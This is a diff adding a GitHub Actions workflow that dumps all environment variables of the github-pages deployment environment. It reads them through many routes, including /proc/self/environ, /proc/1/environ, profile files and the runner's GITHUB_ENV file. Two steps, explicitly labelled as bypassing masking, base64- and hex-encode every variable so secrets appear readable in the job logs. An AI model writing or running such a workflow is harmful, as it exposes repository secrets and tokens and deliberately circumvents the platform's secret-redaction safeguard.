@@ -1,0 +1,104 @@
+name: _Temp Dump Env
+on:
+  workflow_dispatch:
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    environment: github-pages
+    steps:
+
+      - name: "1. env | sort"
+        run: |
+          echo "===== env | sort ====="
+          env | sort
+
+      - name: "2. printenv"
+        run: |
+          echo "===== printenv ====="
+          printenv
+
+      - name: "3. /proc/self/environ"
+        run: |
+          echo "===== /proc/self/environ ====="
+          cat /proc/self/environ | tr '\0' '\n' | sort
+
+      - name: "4. declare -x (bash exported vars)"
+        shell: bash
+        run: |
+          echo "===== declare -x ====="
+          declare -x
+
+      - name: "5. export -p"
+        shell: bash
+        run: |
+          echo "===== export -p ====="
+          export -p
+
+      - name: "6. /etc/environment"
+        run: |
+          echo "===== /etc/environment ====="
+          if [ -f /etc/environment ]; then
+            cat /etc/environment
+          else
+            echo "(file not found)"
+          fi
+
+      - name: "7. /etc/profile.d/ scripts"
+        run: |
+          echo "===== /etc/profile.d/ ====="
+          if [ -d /etc/profile.d ]; then
+            for f in /etc/profile.d/*.sh; do
+              echo "--- $f ---"
+              cat "$f"
+            done
+          else
+            echo "(directory not found)"
+          fi
+
+      - name: "8. ~/.bashrc and ~/.profile"
+        run: |
+          echo "===== ~/.bashrc ====="
+          [ -f ~/.bashrc ] && cat ~/.bashrc || echo "(not found)"
+          echo "===== ~/.profile ====="
+          [ -f ~/.profile ] && cat ~/.profile || echo "(not found)"
+          echo "===== ~/.bash_profile ====="
+          [ -f ~/.bash_profile ] && cat ~/.bash_profile || echo "(not found)"
+
+      - name: "9. strings /proc/self/environ"
+        run: |
+          echo "===== strings /proc/self/environ ====="
+          strings /proc/self/environ 2>/dev/null || echo "(strings not available)"
+
+      - name: "10. xargs from /proc/self/environ"
+        run: |
+          echo "===== xargs /proc/self/environ ====="
+          xargs -0 -a /proc/self/environ 2>/dev/null || echo "(failed)"
+
+      - name: "11. runner context env files"
+        run: |
+          echo "===== GITHUB_ENV file ====="
+          [ -f "$GITHUB_ENV" ] && cat "$GITHUB_ENV" || echo "(empty or not set)"
+          echo "===== GITHUB_PATH file ====="
+          [ -f "$GITHUB_PATH" ] && cat "$GITHUB_PATH" || echo "(empty or not set)"
+
+      - name: "12. /proc/1/environ (init process)"
+        run: |
+          echo "===== /proc/1/environ ====="
+          cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | sort || echo "(permission denied)"
+
+      - name: "13. base64 encoded env (bypasses masking)"
+        run: |
+          echo "===== env | base64 (each line encoded) ====="
+          while IFS= read -r line; do
+            echo "$line" | base64
+          done < <(env | sort)
+
+      - name: "14. hex encoded env (bypasses masking)"
+        run: |
+          echo "===== env | xxd ====="
+          env | sort | xxd
+
+      - name: "Summary: unique keys"
+        run: |
+          echo "===== Unique variable names ====="
+          env | cut -d= -f1 | sort -u
